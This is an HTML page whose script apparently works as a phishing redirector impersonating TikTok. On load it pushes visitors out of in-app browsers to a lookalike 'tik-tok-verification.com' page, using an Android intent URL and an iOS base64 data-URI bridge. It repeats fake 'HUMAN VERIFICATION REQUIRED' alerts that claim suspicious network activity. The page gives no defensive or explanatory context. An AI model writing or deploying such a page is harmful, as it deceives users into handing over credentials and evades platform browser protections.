<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function triggerSafariOnly() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: Pure Intent targeting the VIEW action (Default Browser)
            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
        } else {
            // iOS: Base64 Data-URI Bridge
            // This forces a "Download/Open External" prompt that defaults to Safari.
            const bridgeCode = `<html><script>window.location.replace("${targetUrl}");<\/script></html>`;
            const base64Code = btoa(bridgeCode);
            window.location.href = "data:text/html;base64," + base64Code;

            // Immediate fallback if the data-uri is blocked
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 150);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // 1. Initial Safari Jump
        triggerSafariOnly();

        // 2. Focus Detection
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. User Gesture Relay
                triggerSafariOnly();

                setTimeout(securityLogic, 320);
            }
        }, 320);
    }

    window.onload = securityLogic;
    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
</script>

</body>
</html>
